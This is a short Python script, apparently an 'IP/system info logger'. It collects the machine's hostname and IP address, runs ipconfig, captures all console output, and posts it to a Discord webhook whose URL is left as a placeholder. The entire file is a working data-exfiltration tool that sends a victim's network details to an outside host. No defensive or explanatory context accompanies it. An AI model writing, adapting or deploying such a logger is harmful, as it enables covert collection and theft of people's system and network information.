import os
import socket
import sys
import requests
from io import StringIO
import subprocess

hostname = socket.gethostname()  # IP/system info loggers
IPAddr = socket.gethostbyname(hostname)

# Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
DISCORD_WEBHOOK_URL = 'webhook here'

# Save the original stdout and stderr
original_stdout = sys.stdout
original_stderr = sys.stderr

# Create buffers to capture the output
stdout_buffer = StringIO()
stderr_buffer = StringIO()

# Redirect stdout and stderr to the buffers
sys.stdout = stdout_buffer
sys.stderr = stderr_buffer

def send_to_discord_webhook(message):
    data = {'content': message}
    requests.post(DISCORD_WEBHOOK_URL, json=data)

try:
    # Your main script code here
    result = subprocess.run('ipconfig', shell=True, stdout=subprocess.PIPE, text=True)
    print(result.stdout)
    print(f'userinfo > {hostname} {IPAddr}')
    # Any other print statements or logs go here

finally:
    # Restore the original stdout and stderr
    sys.stdout = original_stdout
    sys.stderr = original_stderr

    # Get the captured output from the buffers
    stdout_output = stdout_buffer.getvalue()
    stderr_output = stderr_buffer.getvalue()

    # Send the output to Discord webhook
    if stdout_output:
        send_to_discord_webhook(f"**STDOUT:**\n```\n{stdout_output}\n```")
    if stderr_output:
        send_to_discord_webhook(f"**STDERR:**\n```\n{stderr_output}\n```")
